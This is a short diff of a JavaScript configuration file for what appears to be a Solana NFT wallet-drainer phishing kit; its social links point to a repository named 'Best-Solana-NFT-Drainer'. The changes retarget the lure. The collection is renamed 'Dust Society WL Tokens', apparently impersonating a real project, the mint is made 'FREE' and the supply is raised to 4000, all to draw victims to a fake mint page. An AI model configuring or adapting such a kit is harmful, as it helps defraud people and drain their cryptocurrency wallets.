@@ -1,7 +1,7 @@
 const collectionInfo = {
-    name: "Yeah Tigers | 0x32Moon", // Name of the collection
+    name: "Dust Society WL Tokens", // Name of the collection
     title: "{name}", 
-    date: "30.06.2022", // Today Date
+    date: "25.10.2022", // Today Date
     socialMedia: {
         discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Discord link
         twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Twitter link
@@ -18,8 +18,8 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 1,
-    totalSupply: 100,
+    price: "FREE",
+    totalSupply: 4000,
 	toFixed: 0,
     minUnits: 1,
     maxUnits: 5,
